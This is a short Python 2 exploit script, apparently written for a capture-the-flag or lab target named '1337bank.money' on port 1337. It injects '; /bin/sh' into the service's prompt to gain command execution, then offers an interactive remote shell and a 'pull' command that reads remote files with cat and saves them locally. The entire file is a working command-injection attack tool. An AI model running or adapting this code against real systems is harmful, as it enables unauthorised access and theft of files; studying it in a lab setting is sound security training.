import socket
import re

host = "1337bank.money" # IP address here
port = 1337 # Port here


def execute_cmd(cmd):
    # Connect to server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    current_directory = ['/']
    # Get prompt
    data = s.recv(1024)
    # Send command that exploits the vulnerability
    s.send('; /bin/sh\n')
    data = s.recv(1024)
    # Enable shell commands
    if cmd == 'shell':
        # Run until user types exit
        while cmd != 'exit':
            # Display current directory as well as prompt for command
            cmd = raw_input((directory_as_string(current_directory) + '> '))
            s.send((cmd+ '\n'))
            # Directory shenanigans
            if not cmd.startswith('cd '):
                print(s.recv(1024))
            else:
                if cmd == 'cd ..':
                    current_directory = current_directory[:-1]
                elif cmd == 'cd /':
                    current_directory = ['/']
                else:
                    current_directory.append(cmd[3:] + '/')
        # Receive results
        print(s.recv(1024))
    # Pull remote file to local machine
    else:
        # Use regex to isolate file locations
        locations = re.match(r'pull (.+) (.+)', cmd)
        # Get the contents of a file
        s.send(('cat ' + locations.group(1) + '\n'))
        data = s.recv(1024)
        # Write contents into a file on local machine
        file = open(locations.group(2), 'w+')
        file.write(data)
        file.close()
        

# Displays directory as a string	
def directory_as_string(current_directory):
    dir = ''
    for x in current_directory:
        dir += x
    return dir

if __name__ == '__main__':
    cmd = raw_input('> ')
    if cmd == 'shell':
        execute_cmd(cmd)
    elif cmd == 'quit':
        exit()
    elif re.match(r'pull .+ .+', cmd) is not None:
        execute_cmd(cmd)
    else:
        print('1. shell Drop into an interactive shell and allow users to gracefully exit')
        print('2. pull <remote-path> <local-path> Download files')
        print('3. help Shows this help menu')
        print('4. quit Quit the shell')